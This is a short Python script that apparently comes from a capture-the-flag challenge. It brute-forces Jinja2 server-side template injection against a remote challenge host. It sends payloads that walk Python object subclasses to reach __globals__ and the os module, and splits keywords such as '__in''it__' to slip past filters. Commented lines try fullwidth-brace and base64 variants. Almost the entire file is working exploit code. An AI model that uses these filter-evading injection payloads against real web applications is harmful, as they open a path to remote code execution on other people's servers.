import requests
import base64
import time

s = requests.session()

flag = ""

for i in range(1, 300):
    #payload = "︷︷().__class__.__bases__[0].__subclasses__()[%s].__init__︸︸" % (str(i))
    #payload = "︷︷().__class__.__bases__[0].__subclasses__()[%s].__init__︸︸" % (str(i))
    #payload=base64.b64encode(payload.encode("utf-8"))
    #data={'text':payload.decode('utf-8')}
    # post_data = {
    #     "str": payload
    # }
    url = "http://7b453e67-bae6-4b72-8f50-fd4ef58d21c7.node4.buuoj.cn:81/?name={%print([].__class__.__base__.__subclasses__()["+str(i)+"][\"__in\"\"it__\"][\"__glo\"\"bals__\"])%}"
    r = s.get(url)
    # r = s.post(url, data=post_data)
    if "wrapper" not in r.text and "os" in r.text:
        print(url)
        print(i)
        print(r.text)
        # break
